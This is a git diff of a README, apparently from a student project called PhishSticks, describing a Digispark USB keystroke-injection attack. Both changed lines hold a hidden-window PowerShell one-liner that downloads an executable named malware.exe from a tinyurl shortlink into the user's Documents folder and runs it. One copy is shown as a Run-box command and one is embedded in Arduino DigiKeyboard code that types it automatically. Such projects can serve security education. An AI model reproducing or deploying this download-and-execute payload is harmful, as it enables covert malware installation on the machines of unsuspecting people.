@@ -133,7 +133,7 @@ TO DO:
 [therealhalonen](https://github.com/therealhalonen) came up with an idea to run the commands straight from Run (Win + R) without having powershell open. Shortening our payload link to a shortlink and modifying the commands a bit, it managed to fit in the Run bar.
 
 ```
-powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/ye2488mj', \"$env:UserProfile/Documents/malvare.exe\");Start-Process \"$env:UserProfile/Documents/malvare.exe\" -WorkingDir \"$env:UserProfile/Documents\""
+powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/36xacafn', \"$env:UserProfile/Documents/malware.exe\");Start-Process \"$env:UserProfile/Documents/malware.exe\" -WorkingDir \"$env:UserProfile/Documents\""
 ```
 
 ![2023-10-11_23-04](https://github.com/therealhalonen/PhishSticks/assets/112076418/02a7b00a-7a83-4f37-91ed-fdb08ef66cf6)
@@ -151,7 +151,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
-  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/ye2488mj', \\\"$env:UserProfile/Documents/malware.exe\\\");Start-Process \\\"$env:UserProfile/Documents/malware.exe\\\" -WorkingDir \\\"$env:UserProfile/Documents\\\"\"");
+  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/36xacafn', \\\"$env:UserProfile/Documents/malware.exe\\\");Start-Process \\\"$env:UserProfile/Documents/malware.exe\\\" -WorkingDir \\\"$env:UserProfile/Documents\\\"\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   exit(0);
